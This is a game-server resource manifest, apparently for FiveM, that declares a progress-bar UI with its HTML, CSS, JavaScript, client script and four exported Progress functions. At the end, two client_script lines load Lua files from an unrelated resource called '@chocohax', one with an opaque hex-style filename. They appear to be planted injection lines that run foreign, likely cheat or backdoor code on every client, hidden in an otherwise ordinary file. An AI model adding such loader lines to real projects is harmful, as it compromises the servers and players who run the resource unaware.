resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

ui_page('html/index.html') 

client_scripts {
    'client/main.lua'
}

files {
    'html/index.html',
    'html/css/style.css',
    'html/js/script.js'
}

exports {
    'Progress',
    'ProgressWithStartEvent',
    'ProgressWithTickEvent',
    'ProgressWithStartAndTick'
}
client_script '@chocohax/95158.lua'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'